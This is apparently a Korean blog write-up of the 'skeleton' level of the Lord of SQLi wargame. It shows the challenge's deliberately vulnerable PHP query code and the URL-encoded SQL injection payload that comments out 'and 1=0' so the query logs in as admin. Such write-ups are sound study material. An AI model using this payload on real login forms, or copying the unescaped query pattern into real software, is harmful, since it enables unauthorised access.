---
layout: post
title: ! "[LOS] skeleton"
categories: [LOS]
excerpt: " "
comments: true
share: true
tags:
  - LOS
  - Web-hacking
  - skeleton
  - write-up
---

![]({{ site.baseurl }}/assets/posts/los/skeleton.png)

`query : select id from prob_skeleton where id='guest' and pw='' and 1=0`
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("skeleton"); 
  highlight_file(__FILE__); 
?>
```
skeleton 문제는 and 1=0 이 새로 추가 되었고 id는 admin이어야 문제가 풀린다.
and 1=0부분을 주석처리하면 되겠다 싶어서
`?pw=1234%27%20or%20id=%27admin%27%20--`

이렇게 입력을 했었는데 
![]({{ site.baseurl }}/assets/posts/los/skeleton_comment.png)
-- 뒤에 공백이 없어서 안됐었다.

그래서 -- 뒤에 %20 을 추가해줬다.
`?pw=1234%27%20or%20id=%27admin%27%20--%20`

![]({{ site.baseurl }}/assets/posts/los/skeleton_clear.png)
